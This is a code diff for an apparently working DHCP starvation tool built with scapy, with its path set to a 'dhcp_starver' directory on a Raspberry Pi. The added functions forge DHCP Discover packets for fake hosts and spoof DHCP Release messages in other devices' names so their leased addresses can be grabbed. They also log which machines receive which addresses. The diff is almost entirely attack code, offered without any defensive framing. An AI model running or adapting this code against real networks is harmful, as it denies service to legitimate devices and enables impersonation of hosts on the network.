@@ -7,7 +7,27 @@ import netifaces
 import ipaddress
 import scapy.all as scapy
 import json
+import time
 import utils
+from utils import write_to_log
+
+
+#### GLOBAL VARIABLES #### ---------------------------------------------------------
+iface = "eth0"  # Network interface to spoof
+json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
+# List to store captured DHCP packets
+captured_packets = []
+
+# DHCP Server's IP and MAC address
+dhcp_server_ip = ""
+dhcp_server_mac = ""
+
+# Our own device's network parameters
+our_ip_address = ""
+our_mac_address = ""
+our_netmask = ""
+our_network = ""
+
 
 #### CLASSES #### ------------------------------------------------------
 class fake_host:
@@ -162,6 +182,65 @@ def create_broadcast_dhcp_request_packet(host):
     return dhcp_request
 
 
+def create_dhcp_discover_packet(host):
+    """
+    Creates a broadcast DHCP Discover with host's parameters
+    """
+    mac_address = host.mac_address
+    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
+    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    # Making DHCP Discover packet
+    ether_header = scapy.Ether(src=host_mac, 
+                               dst="ff:ff:ff:ff:ff:ff")
+    ip_header = scapy.IP(src="0.0.0.0", 
+                         dst="255.255.255.255")
+    udp_header = scapy.UDP(sport=68, 
+                           dport=67)
+    bootp_field = scapy.BOOTP(chaddr=host_mac, 
+                              xid=host.transaction_id,
+                              flags=0) # Unicast
+                              #flags=0x8000) # Broadcast
+    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
+                                     ("client_id", b'\x01' + host_mac),
+                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
+                                     ("hostname", host.hostname), 
+                                     "end"])
+    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
+
+    return dhcp_discover
+
+
+def send_release(host_mac, ip_address, delay, server_ip, server_mac, interface):
+    """
+    Send DHCP Release
+    """
+    # Getting a random Trans ID
+    trans_id = random.getrandbits(32)
+    # Converting MAC addresses
+    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
+    formatted_server_mac = int(server_mac.replace(":", ""), 16).to_bytes(6, "big")
+    # Making DHCP Release packet
+    ether_header = scapy.Ether(src=mac_address, 
+                               dst=formatted_server_mac)
+    ip_header = scapy.IP(src=ip_address, 
+                         dst=server_ip)
+    udp_header = scapy.UDP(sport=68, 
+                           dport=67)
+    bootp_field = scapy.BOOTP(chaddr=mac_address,
+                              ciaddr=ip_address,
+                              xid=trans_id,
+                              flags=0)
+    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
+                                     ("server_id", server_ip),
+                                     "end"])
+    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
+
+    scapy.sendp(dhcp_request, verbose=False, iface=interface)
+    
+    # Wait for t seconds to try to catch that released IP address
+    time.sleep(delay)
+
+
 def get_dhcp_options(packet):
     """
     Returns a dict with the DHCP packet's DHCP Options
@@ -223,4 +302,34 @@ def handle_dhcp_response(packet, host):
 
         return "NAK"
     
+    return None
+
+
+def process_dhcp_packet(transaction_id, timeout):
+    """
+    Periodically checks for a DHCP packet matching the transaction.
+    """
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+
+        for pkt in captured_packets:
+
+            # Check if packet if DHCP and it's transaction id matches our current transaction
+            if scapy.DHCP in pkt:
+
+                if pkt[scapy.BOOTP].xid == transaction_id:
+
+                    captured_packets.remove(pkt)
+                    return pkt
+                
+                # If an foreign ACK is received, it's interesting to know who gets what ip address
+                elif pkt[scapy.DHCP].options[0][1] == 5:
+
+                    host_mac = mac_to_str(pkt[scapy.BOOTP].chaddr)
+                    host_ip = pkt[scapy.BOOTP].yiaddr
+                    write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
+                    captured_packets.remove(pkt)
+            
+        time.sleep(0.25)
+
     return None
